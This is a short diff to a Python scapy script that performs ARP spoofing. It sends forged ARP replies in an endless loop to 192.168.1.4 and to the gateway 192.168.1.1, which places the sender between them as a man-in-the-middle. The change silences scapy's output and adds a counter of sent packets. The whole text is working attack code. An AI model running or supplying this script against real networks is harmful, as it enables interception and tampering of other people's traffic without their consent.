@@ -24,10 +24,14 @@ def spoof(target_ip,spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)     # op is set to indicate response packet  pdst is the ip of the target
     #print(packet.show())
     #print (packet.summary())
-    scapy.send(packet)
+    scapy.send(packet,verbose=False)
 
+
+sent_packets_count = 2
 while(True):
     spoof("192.168.1.4","192.168.1.1")
     spoof("192.168.1.1","192.168.1.4")
+    print("\r[+] packet sent: " + str(sent_packets_count) ,end="")
+    sent_packets_count += 2
     time.sleep(2)
 
